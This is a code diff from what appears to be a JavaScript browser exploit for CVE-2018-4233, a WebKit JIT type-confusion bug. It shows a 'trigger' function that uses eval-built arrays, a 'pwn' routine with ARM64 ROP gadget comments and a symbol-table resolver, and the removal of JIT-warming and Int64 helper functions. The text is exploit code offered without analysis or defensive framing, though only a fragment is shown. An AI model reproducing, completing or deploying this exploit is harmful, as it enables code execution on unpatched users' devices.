@@ -51,29 +51,8 @@ function fail(x) {
     throw null
 }
 
-function make_compiled_function() {
-    function target(x) {
-        return x*5 + x - x*x;
-    }
-    // Call only once so that function gets compiled with low level interpreter
-    // but none of the optimizing JITs
-    target(0);
-    return target;
-}
-
-function boring_func() {
-    function target() {
-        var value = 0x13371337
-        return value
-    }
-    target()
-
-    return target
-}
-
-counter = 0
-
 // CVE-2018-4233
+counter = 0
 function trigger(constr, modify, res, val) {
     return eval(`
     var o = [13.37]
@@ -286,16 +265,7 @@ function pwn(binary) {
     // 0x180700ae8      1d7845a9       ldp x29, x30, [x0, 0x50]
     // 0x180700aec      1d0846a9       ldp x29, x2, [x0, 0x60]
 
-    Int64.prototype.lo = function()
-    {
-        var b = this.bytes();
-        return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24))>>>0;
-    };
-    Int64.prototype.hi = function()
-    {
-        var b = this.bytes();
-        return (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24))>>>0;
-    };
+
     function fsyms(mem, base, want)
     {
         var stab = null;
